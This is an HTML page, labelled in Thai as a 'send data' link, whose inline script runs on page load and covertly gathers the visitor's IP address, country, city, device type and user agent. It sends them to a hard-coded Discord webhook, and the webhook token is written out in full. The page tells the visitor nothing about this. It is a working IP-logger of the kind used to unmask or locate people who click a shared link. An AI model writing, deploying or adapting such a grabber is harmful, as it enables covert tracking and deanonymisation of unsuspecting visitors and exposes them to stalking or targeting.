<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<title>กดเพื่อส่งข้อมูล</title>
</head>
<body>

<script>
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1454756822044115120/WW3o6xwSmJKSsXttjB9-OOno2oRm6yaVG1BCtf9gvY-6jQksWrpOYn-y7Ol9su4wxP8T";

(async () => {
  try {
    // ดึง IP + ที่อยู่คร่าวๆ
    const res = await fetch("https://ipapi.co/json/");
    const ip = await res.json();

    const ua = navigator.userAgent;
    const device = /Android|iPhone|iPad|iPod/i.test(ua)
      ? "มือถือ"
      : "คอมพิวเตอร์";

    const payload = {
      username: "Auto Data Sender",
      embeds: [{
        title: "📨 มีการเปิดลิงก์ส่งข้อมูล",
        color: 3447003,
        fields: [
          { name: "🌐 IP", value: ip.ip || "ไม่ทราบ" },
          { name: "📍 ประเทศ / เมือง", value: `${ip.country_name || "-"} / ${ip.city || "-"}` },
          { name: "📱 อุปกรณ์", value: device },
          { name: "🧠 User-Agent", value: ua.slice(0, 1000) },
          { name: "🕒 เวลา", value: new Date().toLocaleString("th-TH") }
        ]
      }]
    };

    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    // ถ้าอยากให้ปิดแท็บเอง (บางเบราว์เซอร์อาจไม่ยอม)
    // window.close();

  } catch (err) {
    console.error(err);
  }
})();
</script>

</body>
</html>
